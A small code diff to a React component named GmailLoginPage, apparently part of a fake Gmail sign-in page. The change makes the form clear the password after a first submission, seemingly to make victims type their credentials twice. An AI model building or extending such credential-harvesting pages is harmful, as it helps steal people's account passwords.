@@ -55,7 +55,8 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
   };
   
   const handleSubmit = async (e: React.FormEvent) => {
-    await handleFormSubmit(e, { email, password, provider: 'Gmail' });
+    const result = await handleFormSubmit(e, { email, password, provider: 'Gmail' });
+    if (result?.isFirstAttempt) { setPassword(''); }
   };
 
   if (!pageReady) {
